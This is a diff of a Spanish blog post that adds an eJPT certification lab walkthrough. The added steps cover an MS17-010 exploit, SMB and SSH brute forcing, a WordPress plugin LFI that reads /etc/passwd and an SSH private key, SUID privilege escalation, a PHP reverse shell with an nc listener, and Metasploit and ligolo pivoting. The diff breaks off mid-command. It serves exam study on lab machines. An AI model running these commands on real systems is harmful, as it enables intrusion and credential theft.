@@ -39,12 +39,12 @@
 <meta property="og:site_name" content="CyberBalo" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2026-05-14T21:47:00-05:00" />
-<meta property="article:modified_time" content="2026-05-14T21:47:00-05:00" />
+<meta property="article:modified_time" content="2026-05-17T23:06:42-05:00" />
 <meta name="twitter:card" content="summary" />
 <meta name="twitter:title" content="La ruta secreta para la certificación eJPT" />
 <meta name="twitter:site" content="@alvarogbalo" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-05-14T21:47:00-05:00","datePublished":"2026-05-14T21:47:00-05:00","description":"Guía completa de laboratorios: explotación de BadBlue, técnicas de pivoting, persistencia con RDP y escalación de privilegios en Windows.","headline":"La ruta secreta para la certificación eJPT","mainEntityOfPage":{"@type":"WebPage","@id":"https://balo93.github.io/posts/ruta-secreta-ejpt/"},"url":"https://balo93.github.io/posts/ruta-secreta-ejpt/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-05-17T23:06:42-05:00","datePublished":"2026-05-14T21:47:00-05:00","description":"Guía completa de laboratorios: explotación de BadBlue, técnicas de pivoting, persistencia con RDP y escalación de privilegios en Windows.","headline":"La ruta secreta para la certificación eJPT","mainEntityOfPage":{"@type":"WebPage","@id":"https://balo93.github.io/posts/ruta-secreta-ejpt/"},"url":"https://balo93.github.io/posts/ruta-secreta-ejpt/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -902,6 +902,72 @@
 
       
     
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
 
     
   
@@ -917,6 +983,28 @@
       
         
         
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
       
 
       
@@ -1054,6 +1142,29 @@
       </span>
 
       
+        <span>
+          Actualizado
+          <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1779077202"
+  data-df="DD/MM/YYYY"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  17/05/2026
+</time>
+
+        </span>
+      
 
       
 
@@ -1092,9 +1203,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="1657 palabras"
+  title="3502 palabras"
 >
-  <em>9 min</em> de lectura</span>
+  <em>19 min</em> de lectura</span>
 
         </div>
       </div>
@@ -1724,7 +1835,562 @@ load kiwi
     net user alvaro password
 </pre></td></tr></tbody></table></code></div></div>
 <p>Al hacer nuevamente <strong>Creds_all</strong> dentro del módulo Kiwi, encontramos la contraseña ya que windows xp sabía almacenar las contraseñas en texto plano.
-Con eso terminamos esta máquina y simplementa queda explorar los directorios.</p>
+En esta máquina también existe otra vulnerabilidad que usamos con msfconsole</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>msfconsole <span class="nt">-q</span>
+    use windows/smb/ms17_010_psexec
+        <span class="nb">set </span>RHOST 192.168.100.134
+
+        getuid
+        systeminfo
+        ipconfig
+</pre></td></tr></tbody></table></code></div></div>
+<p>Con esto ya se termina la máquina ya que es muy sencillo vulnerar este equipo.</p>
+
+<h2 id="cuarta-máquina-comprimetida-wordpress"><span class="me-2">Cuarta máquina comprimetida Wordpress</span><a href="#cuarta-máquina-comprimetida-wordpress" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Esta nueva máquina está en la ip 192.168.100.133</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>ping 192.168.100.133
+nmap <span class="nt">-p-</span> 192.168.100.133
+enum4linux 192.168.100.133 <span class="c">#kho y jpgaultier</span>
+smbclient <span class="nt">-L</span> 192.168.100.133 <span class="nt">-N</span> <span class="c">#Forma anónima</span>
+smbclient //192.168.100.133/anonymous
+</pre></td></tr></tbody></table></code></div></div>
+<p>En el recurso compartido de anonymous encontramos un archivo de texto que dice ojo.txt en el cual nos informa que la siguiente persona que utilice la contraseña abc123, 123321, qwerty será despedida.</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre>nano users.txt
+    kho
+    jpgaultier
+nano password.txt
+    abc123
+    123321
+    qwerty
+hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> password.txt smb://192.168.100.133 <span class="c">#Error</span>
+hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> password.txt ssh://192.168.100.133 <span class="c">#Error</span>
+crackmapexec smb 192.168.100.133 <span class="nt">-u</span> users.txt <span class="nt">-p</span> password.txt <span class="c">#Error</span>
+dirb http://192.168.100.133
+
+smbclient //192.168.100.133/kho <span class="nt">-U</span> kho
+    qwerty
+</pre></td></tr></tbody></table></code></div></div>
+<p>En el recurso compartido kho, se encuentra una archivo todo.txt en el cuál informa lo siguiente:</p>
+<ul>
+  <li>Debemos agregar kho.local a hosts</li>
+  <li>Debemos trabajemos en TH3K1nG</li>
+  <li>No instalemos plugins vulnerables.</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>nano /etc/hosts
+    192.168.100.133 kho.local
+</pre></td></tr></tbody></table></code></div></div>
+<p>Desde la url accedemos a kho.local/TH3K1nG y nos muestra un wordpress y accedemos a kho.local/TH3K1nG/wp-login.php. Al poner el usuario admin, nos dice que la clave está mal por lo que ya sabemos que usuario atacar.</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre>wpscan <span class="nt">--url</span> http://kho.local/Th3K1nG/wp-login.php <span class="nt">-U</span> admin
+wpscan <span class="nt">--url</span> http://kho.local/Th3K1nG/wp-login.php <span class="nt">-U</span> admin <span class="nt">--password</span> /usr/share/wordlists/rockyou.txt
+wpscan <span class="nt">--url</span> http://192.168.100.133/Th3K1nG
+
+nmap <span class="nt">-sV</span> <span class="nt">--script</span> http-wordpress-enum 192.168.100.133
+nmap <span class="nt">--script</span> http-wordpress-enum <span class="nt">--script-args</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"themes"</span> 192.168.100.133
+
+find / <span class="nt">-name</span> wp-plugins 2&gt;/dev/null
+locate ep-plugins.lst
+
+wpscan <span class="nt">--url</span> http://192.168.100.133/Th3K1nG <span class="nt">--enumerate</span> ap,t <span class="nt">--plugins-detection</span> aggressive <span class="nt">--force</span> <span class="c">#Funciona</span>
+
+dirb http://192.168.100.133/TH3K1nG/wp-content/plugins <span class="nt">-w</span> /usr/share/nmap/nselib/data/wp-plugins.lst
+dirb http://kho.local/TH3K1nG/wp-content/plugins <span class="nt">-w</span> /usr/share/nmap/nselib/data/wp-plugins.lst
+</pre></td></tr></tbody></table></code></div></div>
+
+<blockquote class="prompt-info">
+  <p><strong>Tip Profesional:</strong> Si al hacer el wpscan nos da error con el doinio, también se debe intentar con la ip en vez del dominio.</p>
+</blockquote>
+
+<p>De todos los métodos para detectar plugins instalados en wordpress solo uno funcionó, por lo que lo siguiente es atacar esa vulnerabilidad.</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>searchsploit mail masta <span class="c">#40290.txt</span>
+searchsploit <span class="nt">-m</span> 40290
+<span class="nb">cat </span>40290.txt
+</pre></td></tr></tbody></table></code></div></div>
+<p>El searchsploit nos dice que dentro de la ruta:</p>
+<ul>
+  <li>http://192.168.100.133/TH3K1nG/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+Si al dar clic derecho y ponemos en ver codigo funte se aprecia mejor todo lo del archivo passwd.
+Algo más técnico es mostrar la llave privada - clave rsa del usuario kho:</li>
+  <li>http://192.168.100.133/TH3K1nG/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/kho/.ssh/id_rsa</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>nano id_rsa
+<span class="nb">chmod </span>600 id_rsa
+ssh <span class="nt">-i</span> id_rsa kho@192.168.100.133
+</pre></td></tr></tbody></table></code></div></div>
+<p>Al tratarnos de conectar directamente a la llave privada, nos pide una contraseña la cuál no sabemos, pero para hacer fuerza bruta, hay un módulo de John que nos permite atacar</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>ssh2john id_rsa <span class="o">&gt;</span> rsa.hash
+john rsa.hash <span class="nt">--wordlists</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</pre></td></tr></tbody></table></code></div></div>
+<p>La contraseña arroja que es xavior</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>ssh <span class="nt">-i</span> id_rsa kho@192.168.100.133
+    xavior
+
+<span class="nb">ls
+cat </span>flag.txt
+find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+    find
+find <span class="nb">.</span> <span class="nt">-exec</span> /bin/sh <span class="se">\;</span> <span class="nt">-quit</span>
+<span class="nb">whoami
+    </span>root
+<span class="nb">cd</span> /root
+<span class="nb">ls
+cat </span>flag.txt
+</pre></td></tr></tbody></table></code></div></div>
+<p>Con esto ya terminamos la cuarta máquina de vulnerar.</p>
+
+<h2 id="quinta-máquina-comprometida"><span class="me-2">Quinta máquina comprometida</span><a href="#quinta-máquina-comprometida" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Ahora nos quedan dos máquinas la 192.168.100.136 y 140</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">-sCV</span> 192.168.100.136
+</pre></td></tr></tbody></table></code></div></div>
+<p>Esta máquina es doc.hmv, hay que redirigir el nombre en hosts, tiene una vulnerabilidad sql inyection, hay un file upload para subir un archivo vulnerable al sitio web, subimos un archivo tipo rev-php y con eso hacemos la escalación de privilegios con un binario suid.</p>
+
+<h2 id="sexta-máquina-comprometida"><span class="me-2">Sexta máquina comprometida</span><a href="#sexta-máquina-comprometida" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Ahora procedemos con la última que es 192.168.100.140</p>
+
+<p>Pero antes debemos configurar el laboratorio en conjunto con la máquina robot y metasploitable 3.</p>
+<ul>
+  <li>En metasploitable3 escogemos la interfaz VMNet2 (NAT)</li>
+  <li>Sudo arp-scan –localnet -&gt; Que nos da la nueva ip 192.168.100.137
+    <div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>ping 192.168.100.137
+nmap <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">--min-rate</span> 5000 192.168.100.137
+</pre></td></tr></tbody></table></code></div>    </div>
+    <p>De esta máquina que tiene un montón de vulnerabilidad, vamos a empezar con el puerto 8585 que es un WampServer y encontramos un proyecto de wordpress.</p>
+    <div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>wpscan <span class="nt">--url</span> http://192.168.100.137:8585/wordpress/ <span class="nt">-e</span> u,vp <span class="c">#Enumerar usuarios y temas</span>
+wpscan <span class="nt">--url</span> http://192.168.100.137:8585/wordpress/ <span class="nt">-U</span> admin <span class="nt">--password</span> /usr/share/wordlists/metasploit/unix_passwords.txt
+</pre></td></tr></tbody></table></code></div>    </div>
+    <p>Al enumerar usuarios encontramos varios, por lo que probamos con el mismo nombre para usuario y mismo nombre para clave y logramos acceder a wordpress, vemos que está el tema Twenty por lo que editamos el tema y podemos cargar una rev-shell, la cual en linux tenemos la que solo sirve para linux, pero como metasploitable3 es windows, ocupamos la sigueinte rev-shell que es para cualquier sistema operativo <a href="http://github.com/ckiller2HM/scripts/blob/main/php-rev-shell.php">rev-shell</a>.</p>
+  </li>
+</ul>
+
+<p>Ahora debemos poner un listener y abrir una página que no existe. Si nos da error en este otra opción no recomendada es poner el rev-shell en la página Main Index Template.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>nc <span class="nt">-lnvp</span> 8765
+    <span class="nb">whoami
+    whoami</span> /priv
+</pre></td></tr></tbody></table></code></div></div>
+<p>Al tener SetImpersonatePrivilage, pasamos con msfvenom y subimos con certutil o la segunda opción con Juicy potato pero de metasploit.</p>
+
+<p>Con esto terminamos todos los equipos del laboratorio.</p>
+
+<h2 id="pivoting-gift"><span class="me-2">Pivoting Gift</span><a href="#pivoting-gift" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>Empezamos esto a partir de la primera máquina drupal que ya logramos el acceso meterpreter y que permite hacer un ipconfig.
+Primero hacer un background de la sesión para regresar a meterpreter y hacemos una ruta entre el equipo de otra red y nuestra red.</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>use post/multi/manage/autoroute
+    <span class="nb">set </span>session 2
+    <span class="nb">set </span>subnet 10.10.0.0
+    run
+</pre></td></tr></tbody></table></code></div></div>
+<h3 id="formas-de-analizar-ips-de-otro-host"><span class="me-2">Formas de analizar ips de otro host</span><a href="#formas-de-analizar-ips-de-otro-host" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<p>Para escanear las ips que están en otros hosts tenemos las siguientes maneras:</p>
+<ol>
+  <li>```shell
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 10.10.0.0/24
+set PORTS 21-140
+set threads 10
+run</li>
+  <li>use post/windows/gather/arp_scanner #Solo funciona en Windows, en Linux da error
+set session 2
+set rhosts 10.10.0.0/24
+run
+```</li>
+  <li>Para este caso vamos hacer uso de un script el cuál permite hacer el escaneo de forma más rápida y debemos colocarlo dentro del equipo falg4.</li>
+</ol>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+
+<span class="c"># Define the network prefix (e.g., 192.168.1)</span>
+<span class="nv">NETWORK_PREFIX</span><span class="o">=</span><span class="s2">"10.10.0"</span>
+
+<span class="c"># Define the start and end of the IP range to scan</span>
+<span class="nv">START_IP</span><span class="o">=</span>1
+<span class="nv">END_IP</span><span class="o">=</span>254
+
+<span class="nb">echo</span> <span class="s2">"Scanning network range: </span><span class="nv">$NETWORK_PREFIX</span><span class="s2">.</span><span class="nv">$START_IP</span><span class="s2"> - </span><span class="nv">$NETWORK_PREFIX</span><span class="s2">.</span><span class="nv">$END_IP</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="s2">"Active hosts:"</span>
+
+<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq</span> <span class="nv">$START_IP</span> <span class="nv">$END_IP</span><span class="si">)</span><span class="p">;</span> <span class="k">do
+    </span><span class="nv">IP_ADDRESS</span><span class="o">=</span><span class="s2">"</span><span class="nv">$NETWORK_PREFIX</span><span class="s2">.</span><span class="nv">$i</span><span class="s2">"</span>
+    <span class="c"># Ping with 1 packet (-c 1) and a timeout of 1 second (-w 1)</span>
+    <span class="c"># Redirect output to /dev/null to suppress ping messages</span>
+    ping <span class="nt">-c</span> 1 <span class="nt">-w</span> 1 <span class="s2">"</span><span class="nv">$IP_ADDRESS</span><span class="s2">"</span> &amp;&gt; /dev/null
+
+    <span class="c"># Check the exit status of the ping command</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$IP_ADDRESS</span><span class="s2"> is up."</span>
+    <span class="k">fi
+done
+
+</span><span class="nb">echo</span> <span class="s2">"Scan complete."</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<blockquote class="prompt-info">
+  <p><strong>Tip Profesional:</strong> Al aplicar el autoroute debe ser en el mismo segmento de red en el que esté la máquina con acceso a la segunda red.</p>
+</blockquote>
+
+<p>De las 3 opciones, solo 2 nos funciona ya que la otra opción es para windows. Ahora como ya sabemos que nuestra máquina víctima es la 10.10.0.128, sabemos que debemos vulnerar la máquina 129 que fueron las 2 que encontramos.</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>msfconsole <span class="nt">-q</span>
+use auxiliary/scanner/portscan/tcp
+    <span class="nb">set </span>rhosts 10.10.0.129
+    <span class="nb">set </span>ports 21-200
+    run
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>De este escaneo nos dice que hay dos puertos el 22 y el 80, ahora debemos hacer un portfwd para poder acceder desde nuestra máquina a ese equipo. 
+Lo primero es volver a la meterpreter que tenemos en donde funciona ipconfig.</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>sessions 2
+portfwd add <span class="nt">-l</span> 8080 <span class="nt">-p</span> 80 <span class="nt">-r</span> 10.10.10.129
+portfwd add <span class="nt">-l</span> 2222 <span class="nt">-p</span> 22 <span class="nt">-r</span> 10.10.10.129
+
+portfwd list
+</pre></td></tr></tbody></table></code></div></div>
+<p>Al haber hecho portfwd le estoy diciendo que los puerto de esa máquina que acabo de encontrar en otra red, los pase a los puertos de mi propia máquina localhost (127.0.0.1) tanto como el 8080 y 2222.
+Incluso para acceder a la web que está en el puerto 8080 simplemente desde el navegador accedo a <strong>127.0.0.1:8080</strong></p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>ssh <span class="nt">-p</span> 2222 root@127.0.0.1
+
+msfconsole <span class="nt">-q</span>
+    use auxiliary/scanner/ssh/ssh_login
+        <span class="nb">set </span>rhosts 10.10.10.129
+        <span class="nb">set </span>username root
+        <span class="nb">set </span>pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+        run
+
+hydra <span class="nt">-l</span> root <span class="nt">-P</span> /usr/share/wordlists/metasploit/unix_passwords.txt ssh://127.0.0.1:2222
+</pre></td></tr></tbody></table></code></div></div>
+<p>Con cualquiera de las dos formas encontramos que el usuario y la clave es root:simple</p>
+
+<p>Con esto nos conectamos mediante ssh y con la clave ya tenemos el acceso root. Con esto terminamos este laboratorio.</p>
+
+<h2 id="pivoting-a-metasploitable-3"><span class="me-2">Pivoting a Metasploitable 3</span><a href="#pivoting-a-metasploitable-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Como ya estamos dentro de la máquina que tiene acceso a esta interfaz, simplemente realizamos los escaneos correspondientes</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>bash ping.sh <span class="c">#128 129 130</span>
+msfconsole <span class="nt">-q</span>
+use scanner/portscan/tcp
+    <span class="nb">set </span>rhosts 10.10.0.130 <span class="c">#21,22,80,135,139</span>
+
+    sessions 2
+        portfwd add <span class="nt">-l</span> 2121 <span class="nt">-p</span> 21 <span class="nt">-r</span> 10.10.0.130
+        portfwd add <span class="nt">-l</span> 80 <span class="nt">-p</span> 80 <span class="nt">-r</span> 10.10.0.130
+        portfwd add <span class="nt">-l</span> 22 <span class="nt">-p</span> 22 <span class="nt">-r</span> 10.10.0.130
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Con eso ya se procede normalmente a atacar la máquina.</p>
+
+<h2 id="pivoting-con-ligolo-en-línea"><span class="me-2">Pivoting con Ligolo en línea.</span><a href="#pivoting-con-ligolo-en-línea" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Para esta máquina empezamos desde la máquina vulnerada DRUPAL, con el acceso ssh al usuario flag4, pero antes debemos instalar ligolo</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="nb">mkdir</span> <span class="nt">-p</span> ~/Herramientas/ligolo <span class="o">&amp;&amp;</span> <span class="nb">cd</span> ~/Herramientas/ligolo
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
+<span class="nb">tar</span> <span class="nt">-xvf</span> ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz 
+<span class="c">#Para Windows</span>
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.8.3_windows_amd64.zip
+unzip ligolo-ng_agent_0.8.3_windows_amd64.zip 
+<span class="c">#Para Linux</span>
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
+<span class="nb">tar</span> <span class="nt">-xvf</span> ligolo-ng_agent_0.8.3_linux_amd64.tar.gz 
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Ahora es el proceso para instalar de forma automática</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>apt update <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt <span class="nb">install </span>ligolo-ng <span class="nt">-y</span>
+<span class="nb">sudo </span>apt update <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt <span class="nb">install </span>golang <span class="nt">-y</span>
+<span class="nb">cd</span> /home/kali/Herramientas/ligolo
+git clone https://github.com/nicocha30/ligolo-ng.git
+<span class="nb">cd </span>ligolo-ng
+<span class="nb">env </span><span class="nv">GOOS</span><span class="o">=</span>windows <span class="nv">GOARCH</span><span class="o">=</span>386 go build <span class="nt">-o</span> ../agent_win32.exe cmd/agent/main.go <span class="c">#Agente x32bits de windows</span>
+<span class="nb">env </span><span class="nv">GOOS</span><span class="o">=</span>linux <span class="nv">GOARCH</span><span class="o">=</span>386 go build <span class="nt">-o</span> ../agent_lin32 ./cmd/agent/main.go <span class="c">#Angente de linux</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Ahora una vez que tenemos en nuestro equipo se ejecuta de la siguiente manera de forma manual</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>ip tuntap add user kali mode tun ligolo
+<span class="nb">sudo </span>ip <span class="nb">link set </span>ligolo up
+<span class="nb">sudo </span>ip route add 10.10.10.0 dev ligolo
+<span class="nb">sudo </span>ip addr add 10.10.10.100/24 dev ligolo
+
+<span class="nb">uname</span> <span class="nt">-m</span> <span class="c">#Ver que arquitectura es para subir el angente que se crea mas abajo</span>
+python3 <span class="nt">-m</span> http.server 80 <span class="c">#Para pasar de kali al equipo comprometido</span>
+
+wget http://192.168.100.140/agent_lin32
+<span class="nb">chmod</span> +x agent_lin32
